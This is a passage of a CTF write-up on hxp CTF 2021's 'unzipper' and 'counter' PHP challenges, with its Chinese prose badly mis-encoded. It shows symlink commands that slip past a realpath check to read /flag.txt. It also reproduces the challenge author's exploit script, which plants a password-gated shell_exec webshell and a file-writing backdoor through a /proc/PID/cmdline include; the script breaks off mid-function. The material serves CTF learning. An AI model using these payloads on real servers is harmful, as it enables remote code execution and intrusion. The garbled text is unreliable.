<p>å¹¶ä¸èƒ½ç†è§£flagåœ¨è¯´ä»€ä¹ˆ<br><code>hxp&#123;dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(&#125;</code></p>
<h3 id="å‘"><a href="#å‘" class="headerlink" title="å‘"></a>å‘</h3><p>å¦‚æœï¼Œæˆ‘èƒ½æ—©ç‚¹æŠŠæœ¬åœ°ç¯å¢ƒæ­èµ·æ¥çš„è¯ï¼Œå¯èƒ½ä¸ä¼šåœ¨ç›®å½•æƒé™ä¸Šè‹¦æ¼è¿™ä¹ˆä¹…ã€‚ã€‚ã€‚<br>ç†è®ºä¸Šæ¥è¯´å‡ºé¢˜äººç»™çš„dockerfileä¹Ÿæ²¡æœ‰ä»»ä½•çš„é—®é¢˜ï¼Œä½†æˆ‘æœ¬åœ°è¿›è¡Œbuildçš„æ—¶å€™ä¼šè¶…çº§æŠ¥é”™ï¼Œdpkgå¦‚ä½•å¦‚ä½•ï¼Œç½‘ä¸Šæœç´¢åŠå¤©å¹¶æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„å›ç­”ï¼Œæœ€åä¸çŸ¥é“åœ¨å“ªä¸ªååƒ»çš„è§’è½é‡Œé¢çœ‹åˆ°äº†ä¸€å¥å‡çº§dockerç‰ˆæœ¬ã€‚ä¸€çœ‹åŸæ¥æˆ‘æœ¬åœ°çš„dockerè¿˜æŒºè€çš„ã€‚ã€‚ã€‚æ›´æ–°dockeråˆ°æœ€æ–°ç‰ˆæœ¬ä¹‹åçœŸçš„å°±buildèµ·æ¥äº†ï¼Œå‘œå‘œ</p>
<h2 id="unzipper"><a href="#unzipper" class="headerlink" title="unzipper"></a>unzipper</h2><p>è¿™ä¸ªé¢˜æ„Ÿè§‰ä¹Ÿå¾ˆéš¾ã€‚ã€‚ã€‚å› ä¸ºæˆ‘çš„æ™ºåŠ›æ¡ä»¶ä½ ä¹ŸçŸ¥é“.jpg</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'session_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'data/'</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$lock</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span> <span class="token punctuation">.</span> <span class="token string">'.lock'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fopen'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flock</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span> <span class="token operator">|</span> <span class="token constant">LOCK_NB</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'flock'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'chdir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ulimit -v 8192 &amp;&amp; /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . '</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(^$|flag)/i'</span><span class="token punctuation">,</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$lock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>é‚£ä¸ªlockfileå’Œdockerfileé‡Œé¢çš„æ–‡ä»¶æ¸…ç†æœ‰å…³ï¼Œä¸ç”¨è€ƒè™‘ï¼ŒåŠŸèƒ½å°±æ˜¯ç»™ä½ å¼€ä¸€ä¸ªsandboxç„¶åä½ å¯ä»¥å¾€é‡Œé¢è§£å‹æ–‡ä»¶ï¼Œç„¶åè¿˜å¯ä»¥æäº¤ä¸€ä¸ªfileå‚æ•°ï¼Œåªè¦è¿™ä¸ªfileçš„realpathä¸­æ²¡æœ‰flagä¸”ä¸ä¸ºç©ºï¼ˆrealpathåœ¨æ–‡ä»¶ä¸å­˜åœ¨æ—¶è¿”å›falseï¼Œå¯ä»¥è¢«<code>^$</code>åŒ¹é…ï¼‰ï¼Œå°±ç»™ä½ è¯»è¿™ä¸ªæ–‡ä»¶<br>è¿™å›flagæ˜¯004çš„ä¸”æ²¡æœ‰readflagäº†ï¼Œå¯ä»¥ç›´æ¥è¯»</p>
<p>å½“ç„¶ï¼Œè§£å‹æ–‡ä»¶ç›´æ¥ä¼ ä¸ªPHPä¸Šå»ä¸å°±å®Œäº†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä½ ä¸çŸ¥é“sandboxçš„è·¯å¾„ï¼ˆå½“ç„¶ï¼Œsandboxå­˜åœ¨sessioné‡Œäº†ï¼Œå¯ä»¥è¯»sessionæ–‡ä»¶è·å–åˆ°ï¼‰ï¼Œç¬¬äºŒä¸ªæ˜¯æ— æ•Œçš„nginxé…ç½®</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">=</span> <span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>åªè§£æindex.phpï¼Œæ‰€ä»¥ä¼ äº†ä¹Ÿå®Œå…¨æ²¡ç”¨</p>
<p>è¯´èµ·è§£å‹zipè¯»æ–‡ä»¶ï¼Œæœ€ç»å…¸çš„å°±æ˜¯æ›¾ç»hctf?(è®°ä¸æ¸…å“ªåœºæ¯”èµ›äº†)çš„zipè½¯é“¾æ¥è¯»æ–‡ä»¶ï¼Œä½†è¿™é‡Œå¤šäº†ä¸€ä¸ªé™åˆ¶ï¼Œå¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œäº†ä¸€ä¸ªrealpathæ“ä½œï¼Œè¿™ä¸ªå‡½æ•°ä¼šå»é™¤æ‰€æœ‰çš„è½¯é“¾æ¥ä»¥åŠç›¸å¯¹ç›®å½•ï¼Œè·³ç›®å½•ç­‰å„ç§æ“ä½œï¼Œç›´æ¥è¿”å›å®Œæ•´çš„è·¯å¾„ã€‚è¿™æ ·å­çš„è¯ï¼Œè½¯é“¾æ¥å°±ä¸èƒ½ç”¨äº†</p>
<p>ä½†è¿™ä¸ªrealpathæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¸èƒ½è¯†åˆ«å„ç§åè®®ï¼Œæ¯”å¦‚ç»å…¸çš„PHPä¼ªåè®®<br>ä½¿ç”¨å¦‚ä¸‹æ“ä½œåˆ›å»ºå‡ºä¸€ä¸ªçœ‹èµ·æ¥æ˜¯PHPä¼ªåè®®çš„ç›®å½•å’Œæ–‡ä»¶ï¼Œå†åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„è½¯é“¾æ¥æ–‡ä»¶</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p php://filter/
<span class="token function">touch</span> php://filter/resource<span class="token operator">=</span>aa
<span class="token function">ln</span> -s /flag.txt aa
</code></pre>
<p>æ‰“ä¸€ä¸ªåŒ…ä¼ ä¸Šå»ï¼Œç„¶åç›´æ¥file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;aaå³å¯è¯»åˆ°flag</p>
<p><strong>å¦‚ä¸‹ä¸¤é¢˜çœ‹äº†å®˜æ–¹wpä»¥åŠå„è·¯ç¥ä»™éé¢„æœŸåæ›´æ–°</strong></p>
<h2 id="counter"><a href="#counter" class="headerlink" title="counter"></a>counter</h2><p>è¿™ä¸ªé¢˜çœ‹äº†è›®ä¹…ä½†å®Œå…¨æ²¡æ‡‚</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$rmf</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -f -- '</span><span class="token punctuation">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'default'</span><span class="token punctuation">;</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'./data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-zA-Z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$rmf</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>ä¹ä¸€çœ‹åˆæ˜¯ä¸€ä¸ªå¸¦ç‚¹ä¸œè¥¿çš„æ–‡ä»¶åŒ…å«ï¼Œå…ˆçœ‹ä¸€ä¸‹é™åˆ¶æ¡ä»¶</p>
<pre><code>php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
php_admin_value[post_max_size] = 12K
php_admin_value[memory_limit] = 32M
php_admin_value[max_execution_time] = 10s
php_admin_value[opcache.enable] = 0
</code></pre>
<p>å…³æ‰äº†ç»å…¸upload progressï¼Œnginxçš„æ—¥å¿—å…¨éƒ¨è¢«é‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œpearcmdèµ·äº†ä¸ªæœ¬åœ°dockerçœ‹äº†ä¸‹æ²¡è£…<br>ä¸è¿‡å’Œä¸Šä¸€é¢˜ä¸åŒï¼Œè¿™æ¬¡çš„nginx configä¸­å…è®¸è§£ææ‰€æœ‰çš„PHPåç¼€äº†</p>
<pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>
    <span class="token keyword">include</span> snippets<span class="token operator">/</span>fastcgi<span class="token operator">-</span>php<span class="token punctuation">.</span>conf<span class="token punctuation">;</span>
    <span class="token keyword">fastcgi_pass</span> unix<span class="token punctuation">:</span><span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token number">.4</span><span class="token operator">-</span>fpm<span class="token punctuation">.</span>sock<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>ä½†fastcgiç›‘å¬çš„æ˜¯Unix socketï¼Œè€Œä¸æ˜¯ç«¯å£ï¼Œå»å¹´çš„hxpctfå‡ºäº†ä¸€ä¸ªfile_put_contentç”¨FTPåè®®ï¼Œç›®çš„ä¸»æœºç«¯å£å¯æ§ï¼Œå†™æœ¬åœ°fpmå¯¼è‡´rceçš„é¢˜ï¼Œä»Šå¹´è¿™ä¸ªæ€è€ƒäº†åŠå¤©æ„Ÿè§‰ftpä¹Ÿæ‰“ä¸é€šäº†ï¼Œæ²¡å¼€è¿œç¨‹åŒ…å«ï¼Œè¯»å–äº†è¿œç¨‹ä¹Ÿåªèƒ½å†™è¿œç¨‹ï¼Œå°±ç®—ç”¨ftp ssrfä¹Ÿæ²¡åœ°æ–¹å†™ã€‚</p>
<p>åŠŸèƒ½å°±æ˜¯è¾“å…¥ä¸€ä¸ªpageï¼Œå…ˆæŠŠè¿™ä¸ªpageè¯»å‡ºæ¥å’Œæ•°å­—1ç›¸åŠ ï¼Œå†å†™è¿›å»ï¼Œæœ€åinclude</p>
<h3 id="å¯èƒ½çš„æ€è·¯ï¼Ÿ"><a href="#å¯èƒ½çš„æ€è·¯ï¼Ÿ" class="headerlink" title="å¯èƒ½çš„æ€è·¯ï¼Ÿ"></a>å¯èƒ½çš„æ€è·¯ï¼Ÿ</h3><p>ç”±äºå­—ç¬¦ä¸²å’Œæ•°å­—ç›¸åŠ ä¼šè¢«è½¬åŒ–ä¸ºæ•°å­—ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è¯´èƒ½å†™è¿›å»çš„å†…å®¹å‡ä¸ºæ•°å­—ï¼ˆæˆ–è€…å¥—å‡ å±‚PHPä¼ªåè®®ï¼Œèƒ½base64æˆ–è€…å‹ç¼©ä¸€ä¸‹ï¼‰<br>é‚£ä¹ˆä¸€ç§å¯èƒ½çš„æ€è·¯å°±æ˜¯å…ˆæ•´ç‚¹æ•°å­—è¿›å»ï¼Œç„¶åæŠŠæ•°å­—å„ç§å¥—filteræœ€åèƒ½å¥—å‡ºæ¥ä¸€ä¸ªshellã€‚ã€‚ã€‚æˆ‘è§‰å¾—æˆåŠŸçš„å¯èƒ½æ€§å¾ˆä½ï¼Œéƒ½ä¸çŸ¥é“æ€ä¹ˆå¥—æµæœ‰å¯èƒ½å¥—æˆè¿™ä¸ªæ ·å­ï¼ŒæŠ›å¼ƒè¯¥æ€è·¯</p>
<p>ç„¶åè¿˜æœ‰ä¸€ä¸ªå¯èƒ½æ€§ï¼Œå°±ç®—pageç›´æ¥æ˜¯ä¸€ä¸ªä¸å¯å†™çš„æ–‡ä»¶ï¼Œå› ä¸ºæœ€åincludeçš„ä¸€å®šæ˜¯æœ¬åœ°çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶å¯å†™ï¼Œå°±æœ€åä¸€å®šä¼šæ˜¯æ•°å­—ç±»å‹ï¼ˆæˆ–å¥—äº†ä¼ªåè®®çš„å˜ä½“ï¼‰ï¼Œæœ€ååŒ…å«è¿›æ¥çš„ä¹Ÿå°±æ˜¯è¿™æ ·çš„æ•°æ®ï¼Œæ²¡æœ‰æ„ä¹‰ã€‚ä½†å¦‚æœä¸€ä¸ªæ–‡ä»¶ä¸å¯å†™ï¼Œé‚£ä¹ˆä¹‹å‰çš„å†™å…¥æ“ä½œå°±æ— æ³•å®Œæˆï¼Œèƒ½å¤Ÿç›´æ¥åŒ…å«è¿›æ¥ã€‚ï¼ˆä½†é—®é¢˜åœ¨äºä¸å¯å†™çš„æ–‡ä»¶éƒ½èƒ½è¢«åŒ…å«æ¥getshelläº†ï¼Œé‚£ä¸æ˜¯çˆ½é£äº†ï¼Œæ–‡ä»¶åŒ…å«æ— æ¡ä»¶ç©¶æé€šæ€ï¼Ÿï¼‰</p>
<p>æ„Ÿè§‰æœ‰ä¸¤ä¸ªåœ°æ–¹æ¯”è¾ƒå¥‡æ€ªï¼Œåˆ é™¤æ–‡ä»¶çš„åœ°æ–¹ä¸ºä»€ä¹ˆè¦ç”¨systemï¼Ÿè¿˜å®šä¹‰äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Ÿç›´æ¥ç”¨è‡ªå¸¦çš„æˆ–è€…å®šä¹‰ä¸€ä¸ªå‡½æ•°éƒ½è¡Œå•Šï¼Œè¿˜éå¾—åŒ¿åï¼Ÿä»¥åŠæ˜æ˜åŒ¿åå‡½æ•°éƒ½escapeshellargäº†ï¼Œåœ¨resetå¤„åˆå¯¹æ–‡ä»¶åè¿›è¡Œäº†[a-zA-Z0-9]çš„é™åˆ¶ï¼Œæ€ªã€‚ä½†æ˜¯ä¹Ÿæƒ³ä¸å‡ºæ¥æœ‰ä»€ä¹ˆé—®é¢˜</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>æœç„¶è¿™ä¸ªsystemæœ‰é—®é¢˜ï¼Œè¿™ä¸¤ä¸ªé¢˜éƒ½æ˜¯è€ƒå¯Ÿçš„åœ¨å°é”äº†å„ç§ä¹‹å‰å·²æœ‰æ“ä½œçš„æƒ…å†µä¸‹å¦‚ä½•å†æ¬¡è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚è¿™é‡Œä½¿ç”¨çš„å°±æ˜¯è¿™ä¸ªsystemå‡½æ•°ï¼Œå› ä¸ºsystemæ˜¯ä¼šæ–°å¼€è¿›ç¨‹å»è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ï¼Œå› æ­¤å¯ä»¥æŠŠéœ€è¦åˆ é™¤çš„æ–‡ä»¶åè¾“å…¥ä¸€ä¸²base64ï¼Œè¿™æ ·å­systemå¯¹åº”çš„<code>/proc/$PID/cmdline</code>å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„è¾“å…¥ï¼Œä¸”cmdlineè¿™ä¸ªæ–‡ä»¶é»˜è®¤åªè¯»ï¼Œè¿™æ ·å­å°±æ— æ³•å†™å…¥ï¼Œç›´æ¥åŒ…å«ï¼Œç”±äºåªå…è®¸[a-zA-Z0-9]ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥åº”å½“æ˜¯base64ï¼Œå¹¶ä½¿ç”¨PHP filterçš„base64-decodeè¿‡æ»¤å™¨è¿›è¡ŒåŒ…å«å®Œæˆåˆ©ç”¨<br>ä¹‹å‰å¥½åƒåˆåœ¨å“ªå¬è¯´è¿‡PHPä¸èƒ½è¯»procæ–‡ä»¶ç³»ç»Ÿï¼Œå¯èƒ½æ˜¯æˆ‘çš„é”™è§‰å§ã€‚ã€‚ã€‚</p>
<p>æ€ªäº†ï¼Œæ€ä¹ˆå½“åˆå¤§å®¶éƒ½æ²¡æƒ³åˆ°è¿™ä¸ªåˆ©ç”¨ï¼Œåè€Œéƒ½æ˜¯ç”¨çš„includerâ€™s revengeçš„è¶…çº§æ¡ä»¶ç«äº‰å®ç°çš„</p>
<p>è¿™é‡Œçš„æœ€å¤§é—®é¢˜å°±æ˜¯pidçš„é¢„æµ‹äº†ï¼Œå› ä¸ºrmè¿™ä¸ªå‘½ä»¤åˆæ´»ä¸äº†å¤šä¹…ï¼Œè€Œä¸”æˆ‘ä»¬ä¸€ç›´åœ¨å‘é€è¯·æ±‚å°±ä¼šä¸€ç›´åˆ›å»ºæ–°çš„rmè¿›ç¨‹ï¼ŒpidæŒç»­å˜æ¢ï¼Œæƒ³è¦ç›´æ¥ç¢°æ’åˆ°éš¾åº¦ç•¥å¤§<br>æ‰€ä»¥å‡ºé¢˜äººæåˆ°äº†procä¸­çš„å¦ä¸€ä¸ªæ–‡ä»¶</p>
<blockquote>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;ns_last_pid (since Linux 3.3)</p>
</blockquote>
<p>This file (which is virtualized per PID namespace) displays the last PID that was allocated in this PID namespace. When the next PID is allocated, the kernel will search for the lowest unallocated PID that is greaterthan this value, and when this file is subsequently read it will show that PID.</p>
<p>é€šè¿‡è¯»å–è¿™ä¸ªæ–‡ä»¶èƒ½æ›´å¥½çš„å¯¹æ¥ä¸‹æ¥å¯èƒ½å‡ºç°çš„pidè¿›è¡ŒçŒœæµ‹å¹¶å®ç°åŒ…å«</p>
<p>ä»¥åŠå‡ºé¢˜äººçš„è„šæœ¬</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># hxp CTF 2021 counter</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> time<span class="token punctuation">,</span>os<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> re<span class="token punctuation">,</span> tempfile<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span>secrets<span class="token punctuation">,</span> hashlib<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> random<span class="token punctuation">,</span> signal
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>quote_from_bytes
<span class="token keyword">def</span> <span class="token function">urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> quote_from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token punctuation">)</span>

url <span class="token operator">=</span> f<span class="token string">'http://{sys.argv[1]}:{sys.argv[2]}/'</span>

backdoor_name <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
secret <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
secret_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] backdoor_name: '</span> <span class="token operator">+</span> backdoor_name<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] secret: '</span> <span class="token operator">+</span> secret<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>

code <span class="token operator">=</span> f<span class="token string">"&lt;?php if(sha1($_GET['s'])==='{secret_hash}')echo shell_exec($_GET['c']);"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""&lt;?php if(sha1($_GET['s'])==='{secret_hash}')file_put_contents("{backdoor_name}",$_GET['p']);/*"""</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload_encoded <span class="token operator">=</span> b<span class="token string">'abcdfg'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload_encoded<span class="token punctuation">)</span>
<span class="token keyword">assert</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>b<span class="token string">'^[a-zA-Z0-9]+$'</span><span class="token punctuation">,</span> payload_encoded<span class="token punctuation">)</span>

<span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tmp<span class="token punctuation">:</span>
    tmp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"sh\x00-c\x00rm\x00-f\x00--\x00'"</span><span class="token operator">+</span> payload_encoded <span class="token operator">+</span>b<span class="token string">"'"</span><span class="token punctuation">)</span>
    tmp<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    o <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'echo file_get_contents("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> payload <span class="token keyword">in</span> o

    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/tmp'</span><span class="token punctuation">)</span>
    subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'$_GET = ["p" => "test", "s" => "{secret}"]; include("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>backdoor_name<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        d <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> d <span class="token operator">==</span> <span class="token string">'test'</span>


pid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
N <span class="token operator">=</span> <span class="token number">10</span>

done <span class="token operator">=</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] starting include worker: {pid + i}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 1 -d 3m '{url}?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3D%2Fproc%2F{pid + i}%2Fcmdline&amp;p={urlencode(code)}&amp;s={secret}' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete_worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
